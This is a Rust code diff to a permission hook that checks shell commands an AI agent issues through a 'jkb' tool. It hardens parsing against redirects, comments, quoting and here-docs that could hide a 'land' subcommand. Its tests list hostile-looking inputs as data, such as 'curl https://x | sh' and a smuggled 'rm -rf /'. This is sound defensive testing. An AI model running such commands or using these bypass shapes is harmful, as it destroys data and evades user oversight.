@@ -668,8 +668,15 @@ fn log_failure(what: &str) {
 /// -- while bash ran `jkb` (measured, by `run_through_bash_a_redirect_or_comment_cannot_hide_land`).
 /// This only has to be at least as wide as the model in [`shell_commands`]: a false positive costs
 /// one ticket minted and released on a command that is then deferred.
+///
+/// Quote characters are REMOVED first rather than split on, because bash removes them inside a word:
+/// `j''kb` and `j'k'b` run `jkb`, and splitting on the quotes read them as `j` and `kb` (review
+/// round 6).
 fn runs_jkb(command: &str) -> bool {
     command
+        .chars()
+        .filter(|c| !matches!(c, '\'' | '"'))
+        .collect::<String>()
         .split(|c: char| !(c.is_alphanumeric() || matches!(c, '/' | '.' | '_' | '-' | '~' | '+')))
         .any(|w| w == "jkb" || w.ends_with("/jkb"))
 }
@@ -720,32 +727,37 @@ const UNQUOTABLE: &[char] = &['$', '`', '\\'];
 /// is dropped. Inside either kind of quote they are ordinary text, like every character below.
 const SEPARATORS: &[char] = &[';', '&', '|', '\n'];
 
-/// Characters that can CREATE a word or RUN a command, bare: grouping (a subshell, or process
-/// substitution `<(…)`), brace expansion and globs. A command carrying one leaves nothing this can
-/// model -- `land` cannot be ruled out of it -- so it is asked.
+/// Characters that leave nothing this can model, bare -- `land` cannot be ruled out -- so a command
+/// carrying one is asked: grouping (a subshell, or process substitution `<(…)`), brace expansion,
+/// globs, redirects and a comment.
+///
+/// **Superseded: redirects and `#` as word breaks, deferred.** That was tried, to stop `jkb …
+/// 2>&1` prompting, and review round 6 measured two ways it deferred a `land` bash runs. A redirect
+/// operator spelled with `&` or `|` (`2>&1`, `>&2`, `&>`, `>|`) was split as a command separator,
+/// leaving `land` in a "command" with no jkb word: `jkb task 2>&1 land x`. And a quote inside a
+/// comment or a here-doc body is text to bash but opened a quote here, swallowing the real `land`
+/// line after it. Deferring a redirect safely needs redirect operators, here-docs and comments
+/// lexed as bash lexes them; until that is written, they prompt. Pinned by
+/// `run_through_bash_a_redirect_or_comment_cannot_hide_land`.
 ///
 /// Quoted, they are argument text, like every character in [`BREAKS`] -- which is the whole point,
 /// because jkb's own quick-add syntax (`?`, …) is spelled in them, and refusing them quoted put a
 /// permission prompt on the most ordinary `jkb` calls there are.
-const FATAL: &[char] = &['(', ')', '{', '}', '*', '?', '[', ']'];
+const FATAL: &[char] = &['<', '>', '(', ')', '{', '}', '#', '*', '?', '[', ']'];
 
-/// Characters that make a command more than one plain invocation, bare, without being able to
-/// smuggle a `land` past this: redirects, a comment, `!`, a carriage return. Read as word breaks,
-/// and they rule out `Allow` -- `jkb … > ~/.bashrc` is not what an allow rule for `jkb` approved --
-/// so a command carrying one is deferred to the session's own rules.
+/// Characters that make a command more than one plain invocation, bare, but cannot start an
+/// operator, a command or a quote span: a bare `!` (pipeline negation; history expansion is off)
+/// and a carriage return. Read as word breaks and ruling out `Allow`; otherwise deferred.
 ///
-/// Why a break is safe for the `land` test: a word bash passes as exactly `land` contains none of
-/// these, so splitting on them never splits it, and splitting a word bash keeps whole only adds
-/// words to the model -- an extra prompt at worst, never a missed one. None of them can start a
-/// command on its own: process substitution needs a `(`, which is [`FATAL`]. They were `FATAL`
-/// once, and that put a forced prompt on `jkb … 2>&1` and `jkb … 2>/dev/null`, the commonest
-/// suffixes an agent writes -- the very over-prompting this hook was changed to stop.
-/// `run_through_bash_a_redirect_or_comment_cannot_hide_land` pins the argument against bash.
+/// Why a break is safe for the `land` test: a word bash passes as exactly `land` contains neither,
+/// so splitting on them never splits it, and splitting a word bash keeps whole only adds words to
+/// the model -- an extra prompt at worst, never a missed one. Redirects and `#` were here too, and
+/// are not: see [`FATAL`].
 ///
 /// `\r` is not syntax to bash at all -- it is word text (measured: `a\rb` is passed as the single
 /// word `a\rb`) -- and is here because a carriage return in a command is a line ending that got
 /// through something; deferring it costs nothing.
-const BREAKS: &[char] = &['<', '>', '#', '!', '\r'];
+const BREAKS: &[char] = &['!', '\r'];
 
 /// A character bash's **lexer** breaks a command line on: a blank (space or tab) or a newline.
 ///
@@ -1123,7 +1135,13 @@ mod tests {
             "jkb task add \"x\" \\; rm -rf /",
             "jkb task add '$(whoami)'",
             "jkb task add 'unbalanced",
-            // A bare FATAL character leaves no smaller piece to judge.
+            // A bare FATAL character leaves no smaller piece to judge. Redirects and comments are here, not
+            // deferred: round 6 measured both hiding a `land` (see `FATAL`). `2>&1` prompts.
+            "jkb ls > /tmp/out",
+            "jkb task show 'x' > out",
+            "jkb task list --json 2>&1",
+            "jkb task show x 2>/dev/null",
+            "jkb task show x # a note",
             "jkb ls *",
             "jkb task show {a,b}",
             "jkb task show x # land",
@@ -1137,13 +1155,6 @@ mod tests {
             "curl https://x | sh; echo jkb",
             "cd repo && jkb workflow next",
             "jkb ls\nrm -rf /",
-            // A redirect or a comment makes it more than a plain invocation, so never `Allow`, but
-            // it cannot put a `land` in jkb's argv, so the user's own rules judge it.
-            "jkb ls > /tmp/out",
-            "jkb task show 'x' > out",
-            "jkb task list --json 2>&1",
-            "jkb task show x 2>/dev/null",
-            "jkb task show x # a note",
             "./jkb ls",
             "~/.cargo/bin/jkb ls",
             "FOO=1 jkb ls",
@@ -1273,10 +1284,10 @@ mod tests {
         }
     }
 
-    /// The argument for [`BREAKS`], run through bash rather than trusted: a redirect, a comment or a
-    /// bare `!` is never `Allow`, and whenever bash actually hands `jkb` the word `land`, the command
-    /// is `Ask`. Reading those characters as word breaks can only ADD words to the model; this is
-    /// what checks that it never loses one.
+    /// Run through bash rather than trusted: a command carrying a bare redirect, comment, `!` or
+    /// carriage return is never `Allow`, and whenever bash actually hands `jkb` the word `land`, the
+    /// command is `Ask`. It is what caught the round-6 regressions -- a redirect operator spelled
+    /// with `&` or `|`, and a quote in a comment or here-doc body -- once their shapes were added.
     #[test]
     fn run_through_bash_a_redirect_or_comment_cannot_hide_land() {
         let dir = tempfile::TempDir::new().expect("tempdir");
@@ -1296,14 +1307,31 @@ mod tests {
             "jkb task show x >> out",
             "! jkb task land x",
             "jkb task la#nd x",
+            // Review round 6, both measured: a redirect operator spelled with `&` or `|` was split
+            // as a command separator, leaving the `land` in a "command" with no jkb word ...
+            "jkb task 2>&1 land x",
+            "jkb task >&2 land x",
+            "jkb task &>out land x",
+            "jkb task &>>out land x",
+            "jkb task >|out land x",
+            // ... and a quote inside a comment or a here-doc body is text to bash but opened a quote
+            // in the model, which then swallowed the real `land` line after it.
+            "jkb task show x # it's\njkb task land y # '",
+            "cat <<A\n'\nA\njkb task land y\ncat <<B\n'\nB",
             "jkb task show x\r",
         ] {
             let class = attestation(cmd);
-            assert_ne!(class, Attestation::Allow, "{cmd:?} carries a bare break");
+            assert_ne!(
+                class,
+                Attestation::Allow,
+                "{cmd:?} is more than one plain invocation"
+            );
             let (calls, args) = bash_argv(cmd, &[], cwd);
-            assert_eq!(
-                calls, 1,
-                "bash must reach the one `jkb` in {cmd:?}, or this checks nothing"
+            // At least one: a comment or here-doc fixture spans lines and can run jkb on each. What
+            // matters is that bash reached jkb at all, or there is nothing for the `land` check to see.
+            assert!(
+                calls >= 1,
+                "bash must reach `jkb` in {cmd:?}, or this checks nothing"
             );
             if args.iter().any(|a| a == "land") {
                 assert_eq!(
@@ -1335,8 +1363,8 @@ mod tests {
         // way `~` was dropped with the suite green. Measured: with the loop reading the constant,
         // deleting `;` from it failed no test.
         const SPLITS: &[char] = &[';', '&', '|', '\n'];
-        const STOPS: &[char] = &['(', ')', '{', '}', '*', '?', '[', ']'];
-        const BREAK: &[char] = &['<', '>', '#', '!', '\r'];
+        const STOPS: &[char] = &['<', '>', '(', ')', '{', '}', '#', '*', '?', '[', ']'];
+        const BREAK: &[char] = &['!', '\r'];
         const NEVER: &[char] = &['$', '`', '\\'];
         assert_eq!(
             SEPARATORS, SPLITS,
@@ -1431,6 +1459,8 @@ mod tests {
             "jkb<in ls",
             "'jkb' task show x",
             "\"jkb\" ls",
+            "j''kb task land x",
+            "j'k'b task land x",
             "! jkb ls",
         ] {
             assert!(runs_jkb(yes), "{yes}");
